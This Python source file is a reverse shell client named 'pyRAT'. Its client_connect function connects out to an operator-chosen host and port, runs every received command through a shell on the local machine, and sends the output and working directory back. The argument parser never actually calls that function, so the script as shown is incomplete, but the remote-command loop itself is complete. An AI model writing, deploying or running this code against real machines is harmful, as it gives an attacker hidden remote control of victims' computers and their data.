"""

pyRAT reverse shell client

usage: python v_client.py

notes:

credit: Ivan Teong : https://github.com/iteong/reverse-shell
            his code is used as the base of my reverse shell handler

"""

import socket
import os
import subprocess
import argparse


def client_connect(host, port):
    s = socket.socket()  # client computer can connect to others
    host = host  # args passed in == no need for input
    port = port
    s.connect((host, port))  # binds client computer to server computer

    # infinite loop for continuous listening for server's commands
    while True:
        data = s.recv(1024)
        if data[:2].decode("utf-8") == 'cd':  # command to change directory (cd)
            os.chdir(data[3:].decode("utf-8"))  # look at target directory to cd to

        if len(data) > 0:  # check if there are actually data/commands received (that is not cd)

            # opens up a process to run a cmd similar to running in terminal
            # takes out any output and pipes out to standard stream
            cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                   stdin=subprocess.PIPE)

            # bytes and string versions of results
            output_bytes = cmd.stdout.read() + cmd.stderr.read()  # bytes version of streamed output
            output_str = str(output_bytes, "utf-8")  # plain old basic string

            # getcwd allows the server side to see where the current working directory is on the client
            s.send(str.encode(output_str + str(os.getcwd()) + '> '))
            # print(output_str)  # comment to allow client to see what server side is doing

    # close connection
    s.close()

def parse():
    """parse any arguments passed into the cmd line"""

    parser = argparse.ArgumentParser(prog='v_client.py',
                                     description='''Simple Reverse Shell Client''',
                                     usage='%(prog)s address [-p] [port]'
                                     )
    parser.add_argument("address", type=str, help="server Address : 8.8.8.8")
    parser.add_argument("-p", "--port", type=int, default="9999", help="Port number : 9999")

    args = parser.parse_args()

    # store the input args
    address = args.address
    port = args.port

    # call main method


def main():
    # Parse args passed in then run mgmt module
    parse()


if __name__ == '__main__':
    # call the main function
    main()
